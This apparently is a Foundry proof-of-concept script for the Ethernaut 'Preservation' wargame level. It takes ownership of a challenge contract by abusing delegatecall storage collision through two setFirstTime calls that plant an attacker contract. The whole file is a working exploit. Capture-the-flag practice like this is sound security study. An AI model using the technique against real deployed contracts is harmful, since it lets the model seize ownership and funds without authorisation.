// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/16_IPreservation.sol";
import "../src/16_Preservation.sol";

address constant INSTANCE = 0xD786423fDD4c5f0C99803bD16f5921a255881fb8;

contract PreservationPOCScript is Script {
    IPreservation instance = IPreservation(INSTANCE);

    function run() external {
        vm.startBroadcast();

        assert(instance.owner() != msg.sender);

        PreservationSolution solution = new PreservationSolution();
        instance.setFirstTime(uint256(uint160(address(solution))));
        instance.setFirstTime(uint256(uint160(msg.sender)));

        assert(instance.owner() == msg.sender);

        vm.stopBroadcast();
    }
}
